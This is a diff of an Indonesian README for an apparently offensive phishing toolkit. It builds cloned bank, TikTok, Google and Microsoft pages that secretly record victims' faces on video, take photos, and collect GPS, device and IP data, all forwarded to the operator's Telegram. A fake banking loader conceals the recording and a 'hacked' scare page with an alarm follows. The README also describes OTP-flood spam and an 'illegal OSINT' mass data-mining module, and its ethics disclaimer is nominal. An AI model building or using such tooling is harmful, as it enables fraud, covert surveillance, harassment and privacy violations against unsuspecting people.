@@ -1,4 +1,4 @@
-```
+﻿```
   ███╗   ███╗ ███████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗ ████████╗ ███████╗ ██████╗  ██╗  ██╗
   ████╗ ████║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██╔════╝ ╚██╗ ██╔╝ ╚══██╔══╝ ██╔════╝ ██╔════╝  ██║  ██║
   ██╔████╔██║ █████╗      ██║    ███████║ ██║       ╚████╔╝     ██║    █████╗   ██║      ███████║
@@ -6,380 +6,348 @@
   ██║ ╚═╝ ██║ ███████╗    ██║    ██║  ██║ ╚██████╗    ██║       ██║    ███████╗ ╚██████╗ ██║  ██║
   ╚═╝     ╚═╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝       ╚═╝    ╚══════╝  ╚═════╝ ╚═╝  ╚═╝
 ```
-# METACYTECH Tools
+# METACYTECH Tools (v2.5)
 
-Platform simulasi phishing dan social engineering awareness multi-template.
+Platform simulasi keamanan, ethical penetration testing, dan social engineering awareness berstandar modern dengan sistem multi-template.
 
-**Multi Template:** BNI / TikTok / BIBD / Google Meet / Google Sheets / Microsoft Word / OTP Flood / OSINT Ilegal
-**Fitur:** 8 template aktif, redirect otomatis ke halaman scare page Bjorka, sound effect alert, camera + GPS capture, auto tunnel
-**Teknologi:** Cloudflare Tunnel / Telegram / Next.js
+**Multi Template:** BIBD Brunei / BNI / TikTok / Google Meet / Google Sheets / Microsoft Word / OTP Flood / OSINT Ilegal  
+**Fitur Unggulan:** Capture Video Wajah 10 Detik Otomatis, Foto Instan (500ms), 4 Pilihan Logo Transaksi (DANA, QRIS, GoPay, SeaBank), Konversi Otomatis IDR ⇄ BND, Local Dashboard Modern, Scare Page Bjorka + Audio Alert, Auto Tunnel (Cloudflare / ngrok).  
+**Teknologi:** Next.js (Turbopack / Webpack) / Python 3.13+ / Cloudflare Tunnel / Telegram Bot API / MediaRecorder API / Geolocation.
 
 > [!WARNING]
 > **DISCLAIMER PENTING**
 >
-> Tool ini dibuat untuk tujuan **edukasi, security awareness training, dan authorized penetration testing**.
-> Penggunaan tool ini tanpa izin tertulis dari target adalah **ILEGAL** dan dapat dikenai sanksi hukum
-> (UU ITE Pasal 30-35, Computer Fraud and Abuse Act, GDPR, dan hukum lainnya).
+> Tool ini dirancang dan dikembangkan semata-mata untuk tujuan **edukasi, security awareness training, dan authorized security assessment**.
+> Penggunaan tool ini terhadap target tanpa izin tertulis yang sah adalah **ILEGAL** dan melanggar hukum yang berlaku (UU ITE Pasal 30–35, Computer Fraud and Abuse Act, GDPR, dan regulasi siber lainnya).
 >
-> **Anda bertanggung jawab penuh atas segala penggunaan tool ini.**
+> **Pengguna bertanggung jawab penuh atas segala tindakan dan konsekuensi penggunaan tool ini.**
 
-## Fitur Utama
+---
 
-- **Multi-template system** — 7 template web + 1 mode CLI (OTP Flood) + 1 mode CLI (OSINT)
-- **Scare page Bjorka** — halaman peringatan "perangkat diretas" dengan efek suara alert otomatis, redirect otomatis dari template BIBD setelah verifikasi
-- **Sound effect alert** — file audio MP3 looping otomatis pada halaman scare page
-- **TikTok Custom Title** — ganti title URL bebas (ditanya tiap pilih template TikTok)
-- **Local Dashboard** — edit seluruh teks halaman template langsung dari browser lokal tanpa coding
-- **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
-- **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
-- **Camera dan Location capture** — capture paralel (foto + video simultan), resolusi 640x480 untuk kecepatan
-- **Capture cepat** — GPS timeout 4 detik, foto dalam 300ms, kirim paralel via Telegram
-- **Telegram integration** — pengiriman data real-time
-- **OTP Flood mode** — spam OTP multi-brand via WhatsApp dan SMS
-- **OSINT Ilegal mode** — massive data mining 500+ data points per target, export Excel 12+ sheet
-- **Cross-platform** — Windows dan Termux support
-- **Auto fallback** — ngrok jika Cloudflare Tunnel gagal
-- **Auto CA Repair** — Termux TLS certificate otomatis diperbaiki saat error
-- **TLS Safety Net** — NODE_TLS_REJECT_UNAUTHORIZED=0 di Termux untuk kompatibilitas Node.js
-- **Premium terminal UI** — animasi progress bar, output rapi, format URL [v]
+## 🚀 Fitur Utama & Pembaruan Terbaru (v2.5)
 
-## Persyaratan
+### 1. 🎥 Perekaman Video Wajah 10 Detik Otomatis (Pertama Kali Kamera Aktif)
+- **Aktivasi Otomatis**: Ketika fitur Video 10 Detik diaktifkan pada menu launcher, sistem akan otomatis merekam video wajah target selama 10 detik saat tombol *"AMBIL FOTO RESIT / BUKTI"* pertama kali ditekan.
+- **Instant Photo Snapshot (500ms)**: Bersamaan dengan perekaman video, sistem mengambil foto wajah beresolusi optimal dalam 500 milidetik pertama dan langsung mengirimkannya ke Telegram tanpa harus menunggu rekaman 10 detik selesai.
+- **Realistic Banking Preloader**: Selama 10 detik perekaman berlangsung di kamera depan, viewfinder menampilkan animasi status pemuatan resmi perbankan (*"Menginisialisasi modul kamera..."*) sehingga target tidak mencurigai adanya proses perekaman diam-diam.
+- **Cross-Browser Adaptive Codec**:
+  - **iOS Safari**: Otomatis menggunakan container native `video/mp4` (H.264/AVC).
+  - **Android & Desktop Chrome**: Otomatis menggunakan `video/webm` atau `video/mp4`.
+- **Anti-Hardware Conflict (Seamless Transition)**: Kamera depan dimatikan dan dilepas secara bersih sebelum kamera belakang (*rear camera*) dinyalakan, mencegah error hardware kamera yang sering terjadi pada browser mobile (*NotReadableError*).
 
-| Komponen | Minimum |
-|----------|---------|
-| Python | 3.13+ |
-| Node.js | 20.x+ |
-| NPM | 10.x+ |
-| Cloudflared | 2026+ (opsional, auto fallback ke ngrok) |
-| OS | Windows 10+ / Termux (Android) |
+### 2. 💳 Dukungan 4 Logo Transaksi Resmi (DANA, QRIS, GoPay, SeaBank)
+- Fleksibilitas tampilan metode pembayaran pada template transfer BIBD:
+  - 🔵 **DANA**: Icon dompet digital DANA beresolusi tajam.
+  - ⬛ **QRIS**: Logo standar pembayaran nasional QRIS.
+  - 🟢 **GoPay**: Logo resmi GoPay dengan rasio modern.
+  - 🟠 **SeaBank**: Logo resmi perbankan digital SeaBank.
+- Dapat diganti langsung melalui:
+  1. Menu terminal `run.bat` saat pemilihan template atau menu opsi `[6] Ganti Logo Transaksi`.
+  2. Local Dashboard berbasis web dengan live visual selector.
 
-> [!TIP]
-> **Punya HP Android?** Baca panduan Termux lengkap:
-> [RUN_GUIDE.md — Instalasi Termux dari Nol](RUN_GUIDE.md)
-> Termasuk install Python, Node.js, Git, Cloudflared, setup Telegram, langkah demi langkah.
+### 3. 💱 Konversi Mata Uang Otomatis (IDR ⇄ BND Brunei Darussalam)
+- Cukup masukkan nominal Rupiah (IDR) pada Local Dashboard atau data template, sistem akan otomatis menghitung dan memformat nilai setara dalam Dollar Brunei (BND) dengan kurs presisi (misal: `IDR 50.000` ➔ `BND 3,60`).
 
-### Install Cloudflared
+### 4. 🖥️ Local Web Dashboard Modern (Bebas Macet / Anti-Freeze)
+- Tampilan dashboard web responsif di `http://localhost:5000` untuk mengedit seluruh teks halaman template tanpa perlu menyentuh kode manual.
+- Mendukung live editing: Nama Pengirim, Rekening Pengirim, Nama Penerima, Nomor Rekening/HP Penerima, Nominal IDR/BND, No. Rujukan, Waktu Transaksi, dan Pilihan Logo Transaksi.
+- Proses penyimpanan aman di latar belakang tanpa risiko membuat terminal `run.bat` stuck/freeze.
 
-**Windows:** Download dari [developers.cloudflare.com](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/) dan install ke `C:\Program Files (x86)\cloudflared\`
+### 5. ⚙️ Modular Capture Toggles
+- Pengaturan menu terminal sebelum build untuk memilih modul intelijen yang aktif:
+  - `[1]` Toggle Foto Bukti (Photo)
+  - `[2]` Toggle Video 10 Detik (Video)
+  - `[3]` Toggle Lokasi GPS (Location)
+- Konfigurasi tersinkronisasi otomatis ke `src/app/capture-config.json` dan `templates/bibd/capture-config.json`.
 
-**Termux:**
-```bash
-pkg install cloudflared -y
-```
+### 6. 🚨 Scare Page Bjorka + Audio Alert
+- Setelah target menyelesaikan verifikasi foto resit, halaman otomatis beralih ke halaman peringatan peretasan (*Bjorka Scare Page*).
+- Dilengkapi efek suara peringatan (*alarm alert audio*) berulang dengan kontrol audio terintegrasi.
 
-### Setup Telegram Bot
+### 7. 🌐 Auto Tunneling & Smart Fallback
+- Dukungan otomatis Cloudflare Tunnel (`trycloudflare.com`) dengan auto-update URL ke `metadataBase`.
+- Fallback otomatis ke **ngrok** jika koneksi Cloudflare Tunnel mengalami kendala.
 
-1. Chat [@BotFather](https://t.me/BotFather) di Telegram
-2. Kirim `/newbot` dan ikuti instruksi
-3. Dapatkan **Bot Token** (format: `XXXXXX:XXXXXXXXXXXXXXXXXXXXXXXX`)
-4. Buat grup, tambahkan bot sebagai admin
-5. Kirim pesan ke grup, lalu kunjungi `https://api.telegram.org/bot<TOKEN_ANDA>/getUpdates`
-6. Dapatkan **Chat ID** dari response JSON
+### 8. 📱 Dukungan Penuh Termux (Android)
+- Skrip pendukung Termux dengan **Auto CA Repair** untuk sertifikat TLS dan keamanan koneksi Node.js (`NODE_TLS_REJECT_UNAUTHORIZED=0`).
 
-Buat file `.env.local` di root project:
+---
+
+## 📋 Persyaratan Sistem
+
+| Komponen | Versi Minimum | Keterangan |
+|----------|---------------|------------|
+| **Python** | 3.10+ (disarankan 3.13+) | Runtime untuk `launcher.py` & `local_dashboard.py` |
+| **Node.js** | 20.x+ | Runtime Next.js |
+| **NPM** | 10.x+ | Package Manager |
+| **Cloudflared** | Versi terbaru | Tunneling publik (opsional, auto fallback ke ngrok) |
+| **OS** | Windows 10/11 / Termux (Android) | Kompatibel penuh |
+
+---
+
+## ⚙️ Setup Telegram Bot
+
+Seluruh data hasil capture (Foto, Video 10 Detik, Lokasi GPS, Info Device) akan dikirim secara real-time ke akun/grup Telegram Anda.
+
+1. Buka Telegram dan cari [@BotFather](https://t.me/BotFather).
+2. Kirim perintah `/newbot` dan ikuti petunjuk hingga mendapatkan **Bot Token** (contoh: `123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ`).
+3. Buat grup baru di Telegram dan tambahkan bot Anda sebagai Admin grup.
+4. Kirim sembarang pesan di grup tersebut.
+5. Akses URL: `https://api.telegram.org/bot<TOKEN_ANDA>/getUpdates` pada browser.
+6. Cari nilai `"id"` di dalam objek `"chat"` untuk mendapatkan **Chat ID** (biasanya diawali tanda minus `-` untuk grup).
+7. Buat file `.env.local` di folder root project:
+
 ```env
-TELEGRAM_BOT_TOKEN=XXXXXX:XXXXXXXXXXXXXXXXXXXXXXXX
-TELEGRAM_CHAT_ID=-XXXXXXXXXXXXX
+TELEGRAM_BOT_TOKEN=123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ
+TELEGRAM_CHAT_ID=-1001234567890
 ```
 
-## Cara Penggunaan
+---
 
-### Jalankan Launcher
+## 📖 Cara Penggunaan
 
-**Windows:**
+### 1. Menjalankan di Windows
+Cukup klik ganda file `run.bat` atau jalankan via PowerShell / Command Prompt:
 ```bash
 run.bat
 ```
-
-Atau manual:
+Atau manual melalui Python:
 ```bash
 python launcher.py
 ```
 
-**Termux:**
+### 2. Menjalankan di Android (Termux)
 ```bash
-cd ~/metacytech-tools
+cd ~/transaksi-transfer-bank
 bash run.sh
 ```
 
-### Alur Kerja
+---
 
-Saat pertama kali run, pilih template:
+## 🔄 Alur Kerja Peluncuran (Step-by-Step)
 
+```mermaid
+flowchart TD
+    A[Jalankan run.bat / launcher.py] --> B[Pilih Template 1-8]
+    B --> C{Template yang Dipilih?}
+    C -->|BIBD Brunei| D[Pilih Logo Transaksi: DANA / QRIS / GoPay / SeaBank]
+    C -->|TikTok| E[Input Custom Title URL]
+    C -->|Lainnya| F[Opsi Build & Edit]
+    D --> F
+    E --> F
+    F -->|Opsi 2| G[Buka Local Dashboard di Browser]
+    G --> H[Simpan Perubahan Teks & Nominal]
+    H --> I[Menu Konfigurasi Capture]
+    F -->|Opsi 1| I
+    I --> J[Toggle Foto / Video 10 Detik / GPS]
+    J --> K[Build & Deploy Next.js + Cloudflare Tunnel]
+    K --> L[Dapatkan PUBLIC URL]
 ```
+
+### 1. Pemilihan Template
+Saat aplikasi dijalankan, Anda dapat memilih salah satu dari 8 template:
+```text
   Pilih template:
-  [1]  BNI  Bank Transfer Verification
-  [2]  TikTok  Video Share Link
-  [3]  BIBD  Brunei Darussalam
-  [4]  OTP Flood  Multi-Brand Spam
-  [5]  Google Meet  Video Conference Clone
-  [6]  Google Sheets  Laporan Praktikum Basis Data
-  [7]  Microsoft Word  Laporan Praktikum Basis Data (Makalah)
-  [8]  OSINT Ilegal  Massive Data Mining (500+ data)
-
-  Pilih template (1-8):
+  [1]  BNI             Bank Transfer Verification
+  [2]  TikTok          Video Share Link
+  [3]  BIBD            Brunei Darussalam + Transfer Receipt
+  [4]  OTP Flood       Multi-Brand Verification Spam
+  [5]  Google Meet     Video Conference Clone
+  [6]  Google Sheets   Laporan Praktikum Basis Data
+  [7]  Microsoft Word  Laporan Dokumen Online
+  [8]  OSINT Ilegal    Massive Data Mining (500+ data points)
 ```
 
-Setelah memilih template web (selain OTP Flood dan OSINT), akan muncul opsi:
-
-```
-  Opsi Build & Edit:
-  [1]  Langsung Build & Jalankan
-  [2]  Edit Teks via Local Dashboard
-```
-
-Pilih [2] untuk mengedit seluruh teks pada halaman template melalui browser lokal sebelum build.
-
-**Jika pilih TikTok**, akan muncul prompt title URL:
-
-```
-  Template TikTok - Masukkan Title URL kamu
-  Contoh: TikTok - ChatGpt Pro Free
-  atau biarkan kosong untuk default: TikTok - ChatGpt Pro Free
-
-  Title URL:
+### 2. Pemilihan Logo Transaksi (Khusus Template BIBD)
+Jika memilih template BIBD, Anda akan diminta memilih logo transaksi pembayaran:
+```text
+  Pilih Logo Transaksi Penerima:
+  [1]  DANA
+  [2]  QRIS
+  [3]  GOPAY
+  [4]  SEABANK
 ```
 
-Title ini akan otomatis dipakai di Page Title, OpenGraph, Twitter Card, dan semua metadata halaman.
+### 3. Local Dashboard & Auto Currency Conversion
+Pilih opsi `[2] Edit Teks via Local Dashboard` untuk membuka editor visual interaktif di browser lokal:
+- Mengubah nama rekening pengirim dan penerima.
+- Mengubah nominal transfer dalam IDR (otomatis terkonversi ke BND Brunei).
+- Mengubah tanggal & waktu transaksi (mendukung mode `AUTO` sesuai jam perangkat target).
+- Memilih logo transaksi DANA, QRIS, GoPay, atau SeaBank.
+- Klik **Simpan Data**, lalu kembali ke terminal untuk melanjutkan.
 
-Sistem akan otomatis:
-
-1. Apply template files
-2. Build Next.js app (Webpack di Termux, Turbopack di Windows)
-3. Start server (port 3000)
-4. Start Cloudflare Tunnel (fallback ke ngrok jika perlu)
-5. Update metadataBase dengan tunnel URL
-6. Rebuild dan restart server
-7. Tampilkan PUBLIC URL untuk dibagikan
-
-**Output terminal:**
+### 4. Konfigurasi Fitur Capture (Modular)
+Atur modul mana saja yang ingin diaktifkan:
+```text
+  Fitur Capture:
+  [1]  Foto Bukti           ON
+  [2]  Video 10 Detik       ON
+  [3]  Lokasi GPS           ON
+  [4]  Lanjutkan
 ```
-  ok  applying template
 
-  ok  building
-
-  ok  starting server
-
-  ok  starting tunnel
-
-  ok  rebuilding with url
-
-  ok  rebuilding
-
+### 5. Build, Server, & Tunneling
+Launcher akan menjalankan proses build teroptimasi, menyalakan server lokal, membuka Cloudflare Tunnel, dan menampilkan **Public URL** siap pakai:
+```text
   [v] url               : https://xxxx-xxxx-xxxx.trycloudflare.com
   [v] local             : http://localhost:3000
 ```
 
-### Menu Utama
+---
 
+## 🎯 Alur Interaksi Target & Pengiriman Data
+
+1. **Target Membuka Link**:
+   Target melihat struk / rincian transfer bank BIBD resmi dengan logo pembayaran (DANA/QRIS/GoPay/SeaBank), nominal IDR & BND, serta detail transaksi lengkap.
+2. **Aktivasi Kamera ("AMBIL FOTO RESIT / BUKTI")**:
+   - Sistem meminta izin kamera.
+   - **Foto Wajah Instan**: Dalam 500ms pertama, kamera depan menjepret foto wajah target dan langsung mengirimkannya ke Telegram dengan caption `📸 [BIBD] Foto Wajah (Izin Kamera)`.
+   - **Video Wajah 10 Detik**: Jika diaktifkan, kamera depan merekam video wajah selama 10 detik penuh. Layar target tetap menampilkan preloader elegan (*"Menginisialisasi modul kamera..."*).
+   - Video selesai direkam dan langsung dikirim ke Telegram dengan caption `🎥 [BIBD] Video Wajah 10 Detik (Izin Kamera)`.
+   - Kamera depan dimatikan dan kamera belakang langsung menyala menampilkan viewfinder.
+3. **Pengambilan Foto Resit**:
+   - Target mengambil foto resit / bukti transfer.
+   - Koordinat GPS lokasi target dikirimkan ke Telegram lengkap dengan link Google Maps.
+4. **Verifikasi & Redirect Scare Page**:
+   - Target menekan tombol *"KIRIM BUKTI"*.
+   - Halaman dialihkan otomatis ke **Bjorka Scare Page** dengan audio peringatan darurat yang berputar terus-menerus.
+
+---
+
+## 📊 Daftar Template Lengkap
+
+| No | Template | Deskripsi | Media Capture | Mode |
+|:--:|----------|-----------|:-------------:|:----:|
+| **1** | **BNI** | Konfirmasi transfer bank nasional BNI | Foto + Lokasi GPS | Web |
+| **2** | **TikTok** | Halaman tonton video viral TikTok + Custom Title URL | Foto + Video + GPS | Web |
+| **3** | **BIBD** | Struk transfer Bank Islam Brunei + DANA/QRIS/GoPay/SeaBank + Bjorka Scare Page | Foto + Video 10s + GPS | Web |
+| **4** | **OTP Flood** | Pengiriman flood OTP multi-brand WhatsApp/SMS | - | CLI |
+| **5** | **Google Meet** | Halaman undangan video conference Google Meet | Kamera + Mikrofon | Web |
+| **6** | **Google Sheets**| Spreadsheet dokumen laporan praktikum basis data | Foto + Lokasi GPS | Web |
+| **7** | **Microsoft Word**| Dokumen Word Online laporan praktikum | Foto + Lokasi GPS | Web |
+| **8** | **OSINT Ilegal**| Multi-engine intelligence gathering (500+ parameter, export Excel 12 sheet) | Data Scraping | CLI |
+
+---
+
+## 📁 Struktur Direktori Project
+
+```text
+metacytech-tools/
+├── src/
+│   ├── app/
+│   │   ├── page.tsx                  # Main client component (aktif)
+│   │   ├── layout.tsx                # Root layout & meta tags
+│   │   ├── data.json                 # Data transaksi & teks aktif
+│   │   ├── capture-config.json       # Konfigurasi capture (foto/video/gps)
+│   │   ├── data-bjorka/
+│   │   │   └── page.tsx              # Scare page Bjorka + alarm audio
+│   │   └── api/
+│   │       ├── telegram/route.ts     # Handler pengiriman payload Telegram
+│   │       └── capture/route.ts      # Fast streaming capture endpoint
+│   ├── hooks/
+│   │   └── useVerification.ts        # Hook logika verifikasi & redirect
+│   └── utils/
+│       ├── device.ts                 # Utilitas ekstraksi info perangkat
+│       └── media.ts                  # MediaRecorder & audio/video streams
+├── templates/
+│   ├── bibd/                         # Template BIBD Brunei Darussalam
+│   │   ├── page.tsx
+│   │   ├── data.json
+│   │   └── capture-config.json
+│   ├── bni/                          # Template Bank BNI
+│   ├── tiktok/                       # Template TikTok
+│   ├── googlemeet/                   # Template Google Meet
+│   ├── googlesheets/                 # Template Google Sheets
+│   └── msword/                       # Template Microsoft Word
+├── modules/
+│   ├── otp_flood/                    # Engine pengiriman OTP multi-provider
+│   └── osint_illegal/                # Engine data mining & intelijen target
+├── public/                           # Static assets:
+│   ├── dana-icon.png                 # Logo resmi DANA
+│   ├── qris-icon.png                 # Logo resmi QRIS
+│   ├── gopay-icon.png                # Logo resmi GoPay
+│   ├── seabank-icon.png              # Logo resmi SeaBank
+│   ├── bjorka.jpg                    # Visual Scare Page
+│   └── bjorka.mp3                    # Sound effect alarm alert
+├── launcher.py                       # CLI Launcher utama berbasis Python
+├── local_dashboard.py                # Server web Local Dashboard (Flask/HTTP)
+├── run.bat                           # Launcher otomatis Windows
+├── run.sh                            # Launcher otomatis Termux
+├── .env.local                        # Kredensial Telegram (TIDAK di-commit)
+├── package.json                      # Dependensi Next.js & React
+├── requirements.txt                  # Dependensi Python
+└── RUN_GUIDE.md                      # Panduan lengkap instalasi Termux
 ```
-  [1]  Mulai Semua
-       Build + Server + Cloudflare Tunnel
-  [2]  Hentikan Semua
-  [3]  Status
-  [4]  Salin URL
-  [5]  Ganti Template
-  [6]  Keluar
 
-  Pilih menu (1-6):
-```
+---
 
-Menu [5] Ganti Template juga akan meminta custom title jika switch ke TikTok.
+## 🛠️ Troubleshooting & Solusi Masalah
 
-### Alur BIBD (Contoh)
+### 1. Video Tidak Terkirim di iOS Safari
+- Pastikan iOS Safari telah memberikan izin kamera.
+- Sistem sudah dilengkapi format otomatis `video/mp4;codecs=avc1` khusus Apple WebKit. Pastikan target tidak menutup browser sebelum proses inisialisasi 10 detik selesai.
 
-1. Target membuka link, melihat halaman upload verifikasi BIBD
-2. Target mengisi form dan submit
-3. Halaman menampilkan receipt sukses (tanggal dan waktu otomatis sesuai perangkat target)
-4. Di balik layar, kamera depan mengambil foto diam-diam dan dikirim ke Telegram
-5. Setelah beberapa detik, halaman otomatis redirect ke scare page Bjorka
-6. Scare page menampilkan peringatan perangkat diretas dengan sound effect alert volume penuh yang berulang terus
+### 2. Pesan Error "NotReadableError: Could not start video source"
+- Terjadi jika browser mencoba mengakses kamera depan dan belakang secara bersamaan.
+- Pada versi v2.5, masalah ini telah diatasi dengan mematikan track kamera depan secara tuntas (`stream.getTracks().forEach(t => t.stop())`) sebelum kamera belakang dihidupkan.
 
-### Mendapatkan Data Target
-
-1. Bagikan PUBLIC URL ke target
-2. Monitor Telegram — data terkirim real-time saat target:
-   - Mengizinkan akses kamera
-   - Mengizinkan akses lokasi
-3. Data yang diterima:
-   - Foto dari kamera depan dan Video (10 detik)
-   - Lokasi GPS (dengan link Google Maps)
-   - Info device (OS, browser, RAM, CPU, baterai)
-   - IP address dan ISP
-   - Screen resolution dan orientation
-
-## Template Tersedia
-
-| No | Template | Deskripsi | Mode |
-|----|----------|-----------|------|
-| 1 | BNI | Transfer Bank Verification | Web |
-| 2 | TikTok | Video Share Link + Custom Title + Camera/GPS | Web |
-| 3 | BIBD | Bank Islam Brunei Darussalam + Scare Page Bjorka | Web |
-| 4 | OTP Flood | Spam OTP Multi-Brand (PayPal, Tinder, Telegram, Flip, Lazada, Netflix, dll) | CLI |
-| 5 | Google Meet | Video Conference Clone + Camera/Mic | Web |
-| 6 | Google Sheets | Laporan Praktikum Basis Data + Camera/GPS | Web |
-| 7 | Microsoft Word | Laporan Praktikum Basis Data (Makalah) + Camera/GPS | Web |
-| 8 | OSINT Ilegal | Massive Data Mining 500+ data points per target, Export Excel 12+ sheet | CLI |
-
-## Troubleshooting
-
-### Cloudflared SSL Certificate Error (Termux)
-```
+### 3. Cloudflare Tunnel TLS Error di Termux
+```text
 failed to request quick Tunnel: tls: failed to verify certificate
 ```
-
-**Solusi:** Launcher sekarang auto-repair CA certificates. Jika masih gagal, manual:
+**Solusi:**
 ```bash
 pkg install ca-certificates openssl-tool -y
+update-ca-trust
 ```
-
-Jika masih gagal, sistem auto-fallback ke ngrok (juga auto-install via pkg):
+Jika Cloudflare diblokir oleh ISP, sistem akan otomatis beralih menggunakan **ngrok**:
 ```bash
 pkg install ngrok -y
 ```
 
-### Telegram Bot Tidak Mengirim Data (Termux)
-Di Termux, Node.js mungkin tidak bisa verify sertifikat Telegram. Launcher sudah set:
-- NODE_EXTRA_CA_CERTS=$PREFIX/etc/tls/cert.pem
-- NODE_TLS_REJECT_UNAUTHORIZED=0 (safety net)
-
-Pastikan server direstart setelah git pull (pilih [2] Hentikan Semua, lalu [1] Mulai Semua).
-
-### TikTok Capture Lambat
-Update terbaru sudah optimasi:
-- GPS timeout 8s menjadi 4s
-- Foto delay 1500ms menjadi 300ms
-- Resolusi 1280x720 menjadi 640x480 (lebih cepat upload)
-- Proses paralel: GPS + IP + stream dijalankan bersamaan
-- Kirim paralel: foto, video, lokasi dikirim simultan
-- Progress bar lebih cepat (0.4 detik vs 3 detik)
-
-### "Could not get tunnel URL"
-
-Cek apakah cloudflared/ngrok running:
+### 4. Telegram Bot Mengalami Network / TLS Error (Termux)
+Launcher telah mengonfigurasi environment variable otomatis:
 ```bash
-ps aux | grep cloudflared
-ps aux | grep ngrok
+export NODE_TLS_REJECT_UNAUTHORIZED=0
 ```
+Pastikan untuk me-restart server via menu `[2] Hentikan Semua` kemudian `[1] Mulai Semua`.
 
-Cek tunnel.log:
-```bash
-cat tunnel.log
-```
-
-Test manual cloudflared:
-```bash
-cloudflared tunnel --url http://localhost:3000
-```
-
-### Next.js Build Error (Termux)
-
-Next.js 16 Turbopack tidak support ARM Android. Launcher auto-downgrade ke Next.js 15.3.3 dengan Webpack. Jika error:
-
-```bash
-rm -rf .next node_modules package-lock.json
-npm install --no-bin-links
-npm rebuild
-```
-
-### Port 3000 Already in Use
-
+### 5. Port 3000 atau Port 5000 Sudah Terpakai
 **Windows:**
-```bash
+```powershell
 netstat -ano | findstr :3000
-taskkill /PID <PID> /F
+taskkill /PID <PID_NOMOR> /F
 ```
-
-**Termux:**
+**Termux / Linux:**
 ```bash
-lsof -i :3000
-kill -9 <PID>
+kill -9 $(lsof -t -i:3000)
 ```
 
-## FAQ
+---
 
-**Q: Apakah tool ini legal?**
-A: Ya, untuk security testing dengan izin tertulis dan awareness training. Penggunaan tanpa izin adalah ILEGAL.
+## ❓ Pertanyaan yang Sering Diajukan (FAQ)
 
-**Q: Apakah target tahu sedang di-test?**
-A: Tidak, kecuali Anda memberitahu setelahnya (disarankan untuk ethical testing).
+**Q: Apakah video 10 detik memperlambat proses foto resit?**  
+A: Tidak. Foto wajah instan diambil dalam 500ms pertama dan langsung dikirim ke Telegram. Perekaman video 10 detik berlangsung bersamaan dengan animasi loader bank resmi. Begitu 10 detik usai, kamera belakang langsung siap dipakai untuk memotret resit.
 
-**Q: Data disimpan dimana?**
-A: Data dikirim langsung ke bot Telegram Anda. Tidak disimpan di server kami.
+**Q: Bagaimana jika target menggunakan browser tanpa dukungan WebM?**  
+A: Sistem secara cerdas mendeteksi codec yang didukung (`MediaRecorder.isTypeSupported`). Jika WebM tidak didukung (misal di Safari iOS), sistem otomatis merekam dalam format MP4.
 
-**Q: Bisa running 24/7?**
-A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.
+**Q: Bagaimana cara mengubah logo DANA ke QRIS, GoPay, atau SeaBank?**  
+A: Anda bisa memilihnya langsung pada menu launcher terminal saat memilih template BIBD, atau melalui menu `[6] Ganti Logo Transaksi`, atau melalui Local Dashboard di browser.
 
-**Q: Bisa custom title TikTok?**
-A: Ya. Setiap pilih template TikTok (di awal atau via menu [5]), kamu akan diminta input title URL.
+**Q: Apakah konversi nominal IDR ke BND akurat?**  
+A: Ya, konversi menggunakan kurs resmi Brunei Dollar terhadap Rupiah dengan pembulatan 2 desimal standar mata uang internasional.
 
-**Q: Kenapa build lambat di Termux?**
-A: Next.js 16 Turbopack tidak support ARM. Sistem auto-downgrade ke Next.js 15 dengan Webpack (lebih lambat tapi stabil).
+---
 
-**Q: Kenapa data tidak terkirim ke Telegram dari Termux?**
-A: TLS certificate issue. Launcher sekarang auto-set NODE_TLS_REJECT_UNAUTHORIZED=0 di Termux. Pull update terbaru dan restart server.
+## 👨‍💻 Kontributor & Lisensi
 
-**Q: Cara pakai OTP Flood?**
-A: Pilih template [4] OTP Flood, lalu ikuti menu interaktif untuk mengirim OTP ke nomor target.
-
-**Q: Cara pakai OSINT Ilegal?**
-A: Pilih template [8] OSINT Ilegal, masukkan data target (nama/NIK/nomor), dan sistem akan menjalankan 30+ scanner otomatis. Hasil disimpan dalam file Excel dengan 12+ sheet terpisah.
-
-## Struktur Project
-
-```
-metacytech-tools/
-├── src/
-│   └── app/
-│       ├── page.tsx              # Main page (diganti oleh template)
-│       ├── layout.tsx            # Root layout
-│       ├── data-bjorka/
-│       │   └── page.tsx          # Scare page Bjorka + sound effect
-│       └── api/
-│           ├── telegram/route.ts # Telegram API endpoint
-│           └── capture/route.ts  # Data capture endpoint
-├── templates/
-│   ├── bni/                      # Template BNI
-│   ├── tiktok/                   # Template TikTok
-│   ├── bibd/                     # Template BIBD Brunei
-│   ├── googlemeet/               # Template Google Meet
-│   ├── googlesheets/             # Template Google Sheets
-│   └── msword/                   # Template Microsoft Word
-├── modules/
-│   ├── otp_flood/                # Modul OTP Flood
-│   └── osint_illegal/            # Modul OSINT Ilegal
-├── public/                       # Static assets (logo, favicon, sound)
-├── launcher.py                   # Main launcher script
-├── local_dashboard.py            # Local dashboard untuk edit teks template
-├── run.bat                       # Windows launcher
-├── run.sh                        # Termux launcher
-├── .env.local                    # Environment variables (TIDAK di-commit)
-├── package.json                  # Node.js dependencies
-├── requirements.txt              # Python dependencies
-└── RUN_GUIDE.md                  # Panduan instalasi Termux
-```
-
-## Contributing
-
-Kontribusi dipersilakan. Pastikan:
-1. Follow ethical guidelines
-2. Test thoroughly di Windows dan Termux
-3. Document semua perubahan
-4. Create pull request dengan deskripsi jelas
-
-## License
-
-MIT License — Lihat [LICENSE](LICENSE) untuk detail
-
-## Author
-
-**Iqbal**
-- GitHub: [@iqbalgsr46](https://github.com/iqbalgsr46)
-- Project: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)
+- **Author**: Iqbal ([@iqbalgsr46](https://github.com/iqbalgsr46))
+- **Repository**: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)
+- **License**: MIT License — Lihat [LICENSE](LICENSE) untuk informasi lebih lanjut.
 
 ---
 
 > [!CAUTION]
-> **Gunakan dengan bijak dan bertanggung jawab.**
->
-> Tool ini untuk Security Research dan Awareness. Segala penyalahgunaan di luar tujuan edukasi dan authorized testing adalah tanggung jawab pengguna sepenuhnya.
